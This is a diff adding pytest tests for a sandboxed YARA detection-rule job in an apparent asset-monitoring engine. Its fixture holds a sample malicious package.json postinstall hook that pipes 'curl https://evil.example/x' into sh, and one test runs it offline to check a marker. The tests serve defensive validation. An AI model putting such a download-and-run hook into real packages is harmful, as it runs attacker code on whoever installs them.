@@ -589,3 +589,66 @@ print(json.dumps({'envelope':{'outputs':[],'result':{'docker_binary':shutil.whic
         assert not engine.client.containers.list(all=True, filters={"label":f"{LABEL}={run_id}"})
         assert not engine.client.networks.list(filters={"label":f"{LABEL}={run_id}"})
         assert not engine.client.volumes.list(filters={"label":f"{LABEL}={run_id}"})
+
+
+# A tiny repository and a malicious commit to it (A07). The commit's package.json gains a postinstall
+# payload that would write a marker into the job's outputs, and fetch and run more, if it ever ran: the
+# probe image's sh and touch are enough to write it.
+# The backend's Detection rule test copies POSTINSTALL and POSTINSTALL_RULE verbatim.
+POSTINSTALL_PARENT = {
+    "package.json": '{\n  "name": "shop",\n  "version": "1.0.0",\n  "scripts": {\n    "start": "node server.js"\n  }\n}\n',
+    "server.js": 'require("http").createServer((q,r)=>r.end("shop")).listen(8080);\n',
+}
+POSTINSTALL = {
+    "changed": {"package.json": '{\n  "name": "shop",\n  "version": "1.0.1",\n  "scripts": {\n    "start": "node server.js",\n'
+                                '    "postinstall": "touch /workspace/outputs/payload-ran && curl -s https://evil.example/x | sh"\n  }\n}\n'},
+    "parent": POSTINSTALL_PARENT,
+    "baseline": POSTINSTALL_PARENT,
+}
+POSTINSTALL_RULE = 'rule postinstall_loader { strings: $a = "payload-ran" $b = "evil.example/x" condition: all of them }'
+
+
+def detection_rule(trees, rule=POSTINSTALL_RULE):
+    """A detection_rule run as the backend sends it: one archive input per tree, plus rule.yar."""
+    inputs = [{"path":tree,"content_base64":base64.b64encode(tgz(files)).decode(),"archive":True} for tree, files in trees.items()]
+    return RunRequest(attempt_token=str(uuid.uuid4()), kind="detection_rule", limits={"timeout_seconds":60},
+                      inputs=[*inputs, {"path":"rule.yar","content_base64":base64.b64encode(rule.encode()).decode()}])
+
+
+def test_probe_image_carries_the_pinned_yara(engine):
+    output = engine.client.containers.run("asset-monitor-probe:0.1.0",["yara","--version"],network_mode="none",user="10001:10001",remove=True)
+    assert output.decode().strip() == "4.2.3"
+
+
+def test_detection_rule_validation_never_executes_the_payload(engine):
+    """AC-A07: no job ever executes a Malicious change payload. The real Engine scans the postinstall
+    commit's trees: the rule matches exactly the changed package.json, nothing in the parent or the
+    Baseline, and the payload's marker never appears among the outputs. The job container has no
+    network, no Engine socket and no credential."""
+    run_id, seen = str(uuid.uuid4()), {}
+    def started(event):
+        if event["type"] == "workload_started":
+            container, = engine.client.containers.list(all=True, filters={"label":f"{LABEL}={run_id}"})
+            seen.update(container.attrs)
+    result = execute(engine, detection_rule(POSTINSTALL), run_id, started)
+    assert result["result"] == {"compiled":True,"error":None,"matches":{"changed":{"files":["package.json"],"count":1},
+                                "parent":{"files":[],"count":0},"baseline":{"files":[],"count":0}}}
+    assert result["outputs"] == []
+    # The marker is a real detector: the same payload, run by sh in the probe image, writes it.
+    payload = json.loads(POSTINSTALL["changed"]["package.json"])["scripts"]["postinstall"]
+    ran = engine.client.containers.run("asset-monitor-probe:" + VERSION, ["sh", "-c", payload + "; ls /workspace/outputs"],
+                                       network_mode="none", tmpfs={"/workspace/outputs": "mode=1777"}, remove=True)
+    assert ran.decode().split() == ["payload-ran"]
+    assert seen["Config"]["Image"] == "asset-monitor-probe:" + VERSION
+    assert seen["HostConfig"]["NetworkMode"] == "none" and not seen["HostConfig"]["Privileged"]
+    assert [(m["Destination"], m["RW"]) for m in seen["Mounts"]] == [("/workspace/inputs", False)]
+    image_env = set(engine.client.images.get("asset-monitor-probe:" + VERSION).attrs["Config"]["Env"])
+    assert {e.split("=", 1)[0] for e in set(seen["Config"]["Env"]) - image_env} <= {"HOME", "PATH"}
+
+
+def test_detection_rule_reports_parent_matches_and_scans_only_the_trees_sent(engine):
+    """A07 Commit bullet: a rule that also matches the parent's package.json is reported under parent,
+    and a run sent without baseline/, as for a Backfill commit, has no baseline entry."""
+    trees = {"changed": POSTINSTALL["changed"], "parent": POSTINSTALL["parent"]}
+    result = execute(engine, detection_rule(trees, 'rule start_script { strings: $a = "node server.js" condition: $a }'))
+    assert result["result"]["matches"] == {"changed":{"files":["package.json"],"count":1},"parent":{"files":["package.json"],"count":1}}
